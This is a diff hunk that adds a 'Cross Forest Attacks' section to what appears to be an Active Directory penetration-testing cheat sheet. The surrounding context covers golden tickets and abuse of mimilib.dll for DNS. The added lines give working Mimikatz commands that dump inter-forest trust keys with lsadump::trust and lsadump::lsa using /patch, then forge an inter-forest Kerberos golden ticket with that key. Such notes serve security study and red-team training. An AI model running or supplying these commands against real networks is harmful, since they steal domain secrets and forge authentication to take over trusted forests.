@@ -717,3 +717,11 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `sc \\dcorp-dc start dns`
 
 - By default, the mimilib.dll logs all DNS queries to C:\Windows\System32\kiwidns.log
+
+## Cross Forest Attacks
+- We require the trust key for the inter-forest trust
+  - `Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
+  - or, `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
+  - We can get Net-Bios name of the trust of external trusted forest which is also called trust-key
+- After getting the trust key, an inter-forest TGT can be forged.
+  - `Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain-name> /sid:<SID> /rc4:<trust-key> /service:krbtgt /target:<another-domain> /ticket:C:<attacker-machine-path\trust_forest_tkt.kirbi>"'`
